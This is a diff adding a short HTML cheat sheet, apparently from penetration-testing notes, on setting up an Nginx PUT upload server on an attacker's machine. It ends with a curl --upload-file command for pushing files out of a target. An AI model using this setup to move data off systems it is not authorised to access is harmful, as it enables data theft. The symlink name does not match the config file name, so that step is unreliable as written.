@@ -1,0 +1,29 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Nginx</title>
+</head><body>Nginx file transfers, set up the server on the attacking machine<br/>
+mkdir /var/www/upload<br/>
+chown www-data /var/www/upload<br/>
+chmod 777 /var/www/upload<br/>
+<br/>
+/etc/nginx/sites-available/file-upload<br/>
+server {<br/>
+&nbsp; &nbsp; listen 8001 default_server;<br/>
+&nbsp; &nbsp; server_name ippsec.rocks;<br/>
+&nbsp; &nbsp; location / {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; root /var/www/upload;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; dav_methods PUT;<br/>
+&nbsp; &nbsp; }<br/>
+}<br/>
+<br/>
+ln -s /etc/nginx/sites-available/file_upload /etc/nginx/sites-enabled/<br/>
+systemctl restart nginx<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+upload with:<br/>
+curl --upload-file &lt;file&gt; 127.0.0.1:8001</body></html>
